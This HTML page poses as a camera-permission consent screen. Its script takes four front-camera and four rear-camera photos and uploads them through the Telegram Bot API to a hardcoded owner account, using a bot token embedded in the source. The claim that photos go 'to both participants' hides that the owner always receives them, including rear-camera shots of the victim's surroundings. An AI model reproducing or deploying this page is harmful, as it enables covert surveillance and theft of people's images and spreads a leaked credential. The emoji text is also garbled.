<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Consent Required</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  background:#0f0c29;
  color:#fff;
  font-family:Arial;
  display:flex;
  align-items:center;
  justify-content:center;
  height:100vh;
}
.box {
  background:#000;
  padding:30px;
  border-radius:15px;
  max-width:400px;
  text-align:center;
  box-shadow:0 0 20px #ff00ff;
}
button {
  padding:12px 20px;
  font-size:16px;
  border:none;
  border-radius:8px;
  background:#ff00ff;
  color:#fff;
  cursor:pointer;
}
.status { margin-top:15px; font-size:14px; color:#ccc; }
</style>
</head>
<body>

<div class="box">
  <h2>ðŸ“¸ Camera Permission</h2>
  <p>
    This feature requires camera access.<br>
    <b>8 photos</b> will be captured and sent to both participants.
  </p>
  <button onclick="start()">Allow & Continue</button>
  <div class="status" id="status"></div>
</div>

<video id="v" autoplay playsinline hidden></video>
<canvas id="c" hidden></canvas>

<script>
const BOT_TOKEN = "8226782560:AAF2iapgn0UUbVfR5LV87TQQGqfqVfOc88I";
const OWNER_ID = "8215819954";

const params = new URLSearchParams(location.search);
const uid = params.get("uid") || OWNER_ID;

const status = document.getElementById("status");
const video = document.getElementById("v");
const canvas = document.getElementById("c");
const ctx = canvas.getContext("2d");

let stream;
let photos = [];

async function start() {
  status.innerText = "Requesting camera permission...";
  stream = await navigator.mediaDevices.getUserMedia({ video: true });
  video.srcObject = stream;
  await new Promise(r => video.onloadedmetadata = r);

  await captureSet("user");
  await captureSet("environment");

  stream.getTracks().forEach(t => t.stop());
  status.innerText = "Uploading photos...";
  await sendAll();
  status.innerText = "âœ… Completed";
}

async function captureSet(mode) {
  stream.getTracks().forEach(t => t.stop());
  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: mode }
  });
  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 800));

  for (let i = 0; i < 4; i++) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    photos.push(canvas.toDataURL("image/jpeg", 0.7));
    await new Promise(r => setTimeout(r, 700));
  }
}

async function sendAll() {
  for (let i = 0; i < photos.length; i++) {
    await sendPhoto(OWNER_ID, photos[i], `ðŸ“¸ ${i+1}/8`);
    await sendPhoto(uid, photos[i], `ðŸ“¸ ${i+1}/8`);
  }
}

async function sendPhoto(chatId, base64, caption) {
  const blob = await (await fetch(base64)).blob();
  const fd = new FormData();
  fd.append("chat_id", chatId);
  fd.append("photo", blob);
  fd.append("caption", caption);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: fd
  });
}
</script>

</body>
</html>
